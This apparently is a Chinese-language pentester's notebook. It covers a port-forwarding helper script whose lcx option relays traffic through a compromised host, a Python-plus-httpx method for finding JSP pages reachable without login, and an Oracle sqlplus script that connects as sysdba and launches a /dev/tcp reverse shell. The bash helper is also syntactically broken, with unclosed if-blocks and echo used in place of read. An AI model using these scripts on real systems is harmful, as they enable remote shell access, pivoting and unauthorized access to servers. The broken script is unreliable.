要用到socket编程
因为c#自带了可以引用的包

我们看下shell能不能写

shell好像不行，shell只是一个框架  去调用软件

shell不能称为一个意义上的语言

实际运行的端口转发还是基于c语言的

但是我们仍然可以写一个lion给iptables 和firewall

lcx 和 rineted的端口转发辅助脚本



```bash
#!/bin/bash

echo "正在检测本地有何软件----------------------"
echo "有iptables"

lcx &>/dev/null
if [ $? = 0 ];then
echo "有lcx"
else
echo "无lcx"

rineted &>/dev/null
if [ $? = 0 ];then
echo "有rinetd"
else
echo "无rinetd"

echo "
使用方法:
1.iptables
2.rinetd
3.lcx
"

read -p "请输入序号" xuhao
if [ $xuhao = 1 ];then
#iptables
#  linux的IP转发功能是默认关闭的，而且根据很多安全加固策略以及安全基线的要求，
#  IP转发功能必须关闭，所以需要先打开IP转发。
#  需要长期使用的话则写入到sysctl的配置文件中。
echo 1 >/proc/sys/net/ipv4/ip_forward &>/dev/null
sysctl -w /etc/sysctl.conf &>/dev/null
service iptables stop &>/dev/null
#配置iptables，在PERROUTING链中做DNAT。需要长期使用的话需要注意保存配置。
echo "是否需要清空iptables表  1.要 2.否 (输入序号)" qingkong
    case $qingkong in
    1)
    iptables -F -t nat
    esac
echo "选择连接类型  1.远程 2.本地 (输入序号)" lianjie
    case $lianjie in
    1)
    read -p "远程连接 格式 本地接口ip(123.123.123.123) 本地port(3389)  远程ip+port(110.110.110.110:3389):
    键盘输入格式 “ip port ip+port“ 中间有空格 务必在同一行
    所有访问防火墙z 端口的请求都转发给后端的x 的y 端口
    iptables -t nat -A PREROUTING -p tcp -i eth0 -d $x --dport $y -j DNAT --to $z
    " x y z
    iptables -t nat -A PREROUTING -p tcp -i eth0 -d $x --dport $y -j DNAT --to $z
    service iptables save
    2) 
    read -p "本地连接 格式 本地接口ip(123.123.123.123) 本地port(3389)  本地另一个网卡(也可以同网卡)ip+port(110.110.110.110:3389):
    键盘输入格式 “ip port ip+port“ 中间有空格 务必在同一行
    iptables -t nat -A OUTPUT -p tcp -d 192.168.4.177 --dport 80 -j DNAT --to 127.0.0.1:8080
    " a b c
    iptables -t nat -A OUTPUT -p tcp -d $a --dport $b -j DNAT --to $c
    service iptables save
    esac
fi

if [ $xuhao = 2 ];then
# wget http://www.boutell.com/rinetd/http/rinetd.tar.gz  -P /usr/local
# tar -zxvf rinetd.tar.gz
#  make && make install
#命令格式
#bindaddress bindport connectaddress connectport
read -p "
输入格式(记得 a b c d 同一行 以空格为界 而不是回车)
本地ip(a) 本地端口(b) 远程ip(c) 远程端口(d)
将a的b端口映射为c的d端口
" a b c d
cat >> /etc/rinetd.conf << EOF
$a $b $c $d
EOF
echo "rinetd -c /etc/rinetd.conf" >> /etc/rc.local
fi

if [ $xuhao = 3 ];then
read -p "格式
肉鸡上执行 lcx.exe -slave 公网 ip(a) + 端口(b) 肉鸡 ip(c) + 端口(d)
" a b c d
lcx.exe -slave $a $b $c $d
fi
```

![image-20220414195418408](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204141954615.png)

### 17.研究一下msfpc.sh

![image-20220414203333701](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204142033989.png)

![image-20220414210450087](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204142104355.png)

分析到一半 发现都是利用msf的接口去调用 不分析了

### 18.使用httx遍历可以未授权漏洞url

通过学习《0day的一些思路技能学习这篇文章 》

https://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247484748&idx=1&sn=9c157ff5da7d7229e7c83ac33c6abbe9&chksm=c2829c55f5f515434f375438990e3aa5c362bc1a088f7dba9de7f8b23e169f227cdd807937b0&mpshare=1&scene=23&srcid=0414TDqkw7q7ntcZ3bfrGg7B&sharer_sharetime=1649941691068&sharer_shareid=ee83a55e0b955b99e8343acbb61916b7#rd

学到了很多技术

但是也发现了

使用 httpx 筛选未授权文件

```python
#!/usr/bin/python3
# -*- coding:utf-8 -*-
# @Author : yhy
# 未授权文件获取脚本
import os

home_directory = "/Users/yhy/work/ROOT"     # 填入项目主目录，该目录名在拼接 uri 中会去除,要给全路径，不然有可能替换出错    # 本地或者公网的靶场地址
suffix = ".jsp"             # 要找的后缀
uris = []                   # 拼接的 uri 列表
f = open('output.txt', 'w')

def splicing(root, files):
    for file in files:
        if file.endswith(suffix):
            uri = root + "/" + file + "\n"
            # 去除获取的根目录名
            uris.append(uri.replace(home_directory, "")) 

# 获取项目中所有的文件拼接而成的 uri
def get_URI():
    for root, dirs, files in os.walk(home_directory):
        splicing(root, files)
        # print("root", root)  # 当前目录路径
        # print("dirs", dirs)  # 当前路径下所有子目录
        # print("files", files)  # 当前路径下所有非目录子文件

# 结果保存
def output():
    # 打开一个文件
    fo = open("work.txt", "w")
    fo.writelines(uris)
    # 关闭打开的文件
    fo.close()

if __name__ == "__main__":
    get_URI()
    output()
```

```bash
1. 执行`echo url | httpx -path work.txt -sc -cl -nc -o workHttpx.txt -fc 302,500,501,404`
2. 上一步执行可能还会存在一些提示需要登录的文件路径，记录下长度，再次执行`echo  url | httpx -path work.txt -sc -cl -nc -o orkHttpx.txt -fc 302,500,501,404 -fl 长度`
3. 之后重点查看筛选出的结果，如果审计过程中还存在一些干扰选项，可以不断的执行第二步来排除。

 这种方法还可以用来筛选可以未授权访问的配置文件、xml文件等。

    而且根据这步结果，可以将利用脚本将未授权文件复制到另一个目录中，方便使用工具扫描。
```



oracle反弹shell 普通的oralcle反弹shell无法直接在terminal窗口反弹shell 用以下脚本即可 且此脚本可以兼容二开反弹任意terminal窗口

#!/bin/bash
sqlplus -S /nolog > result.log <<EOF
set heading off feedback off pagesize 0 verify off echo off
conn sys/oracle as sysdba
SET define off;
host echo "/bin/bash -i >& /dev/tcp/ip/port 0>&1" > /usr/share/1.sh;
host chmod 777  /usr/share/1.sh;
host bash  /usr/share/1.sh;
exit
EOF


